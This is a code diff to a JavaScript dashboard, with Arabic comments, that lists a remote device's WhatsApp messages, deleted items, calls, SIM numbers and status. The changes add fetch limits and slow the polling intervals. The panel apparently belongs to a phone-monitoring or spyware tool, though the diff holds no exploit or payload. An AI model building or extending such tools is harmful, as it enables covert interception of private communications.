@@ -657,7 +657,7 @@ async function doReplyWa(sender) {
 
 function openReplyWaPicker() {
     if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-    authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`)
+    authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}&limit=100`)
         .then(res => res.json())
         .then(messages => {
             const senders = [...new Set(messages.map(m => m.sender))].filter(s => s);
@@ -829,7 +829,6 @@ function selectDevice(deviceId) {
     }
 }
 
-// ✅ محدّث: updateLiveData مع كل البيانات الجديدة
 async function updateLiveData() {
     if (!currentDevice) return;
     try {
@@ -837,7 +836,6 @@ async function updateLiveData() {
         const data = await response.json();
         if (data.error) return;
 
-        // ═══ الحالة ═══
         const statusEl = document.getElementById('networkStatus');
         if (statusEl) {
             if (data.online) {
@@ -849,11 +847,9 @@ async function updateLiveData() {
             }
         }
 
-        // ═══ نوع الشبكة ═══
         const netEl = document.getElementById('networkTypeStatus');
         if (netEl) netEl.textContent = data.network_type || '—';
 
-        // ═══ البطارية ═══
         const battEl = document.getElementById('batteryStatus');
         if (battEl) {
             if (data.battery !== null && data.battery !== undefined && data.battery >= 0) {
@@ -863,7 +859,6 @@ async function updateLiveData() {
             }
         }
 
-        // ═══ الشحن ═══
         const chargingEl = document.getElementById('chargingStatus');
         if (chargingEl) {
             if (data.charging) {
@@ -874,7 +869,6 @@ async function updateLiveData() {
             }
         }
 
-        // ═══ آخر اتصال ═══
         const lastSeenEl = document.getElementById('lastSeen');
         if (lastSeenEl) {
             const ago = data.seconds_ago || 0;
@@ -887,7 +881,6 @@ async function updateLiveData() {
             lastSeenEl.textContent = agoText;
         }
 
-        // ═══ العدادات ═══
         if (data.call_count !== undefined) {
             const el = document.getElementById('callCount');
             if (el) el.textContent = `(${data.call_count})`;
@@ -917,7 +910,6 @@ async function updateLiveData() {
             if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.voice_count);
         }
 
-        // ═══ اسم الجهاز + SIM ═══
         if (data.sim_numbers && data.sim_numbers.length > 0) {
             const display = document.getElementById('deviceNameDisplay');
             if (display && !display.textContent.includes(data.sim_numbers[0])) {
@@ -1021,11 +1013,12 @@ async function loadDeleted() {
 
 async function loadWhatsApp() {
     try {
-        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
+        // ✅ limit=50 — لا نقرأ كل الرسائل
+        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}&limit=50`);
         let messages = await response.json();
 
         if (Array.isArray(messages)) {
-            messages = messages.slice(-20);
+            messages = messages.slice(-50);
         }
 
         const div = document.getElementById('whatsappList');
@@ -1071,7 +1064,7 @@ async function loadWhatsApp() {
 
 async function openWhatsAppChat(sender) {
     try {
-        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}&limit=200`);
         const messages = await response.json();
         const senderMessages = messages.filter(m => (m.sender || 'غير معروف') === sender)
             .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
@@ -1730,14 +1723,16 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
     }
 })();
 
+// ✅ كل 60 ثانية بدل 15
 setInterval(() => {
     const secTab = document.getElementById('securityTab');
     if (secTab && secTab.classList.contains('active')) {
         loadAuthorizedDevices();
     }
-}, 15000);
+}, 60000);
 
 loadAuthorizedDevices();
 
+// ✅ كل 30 ثانية بدل 10
 loadDevices();
-setInterval(loadDevices, 10000);
+setInterval(loadDevices, 30000);
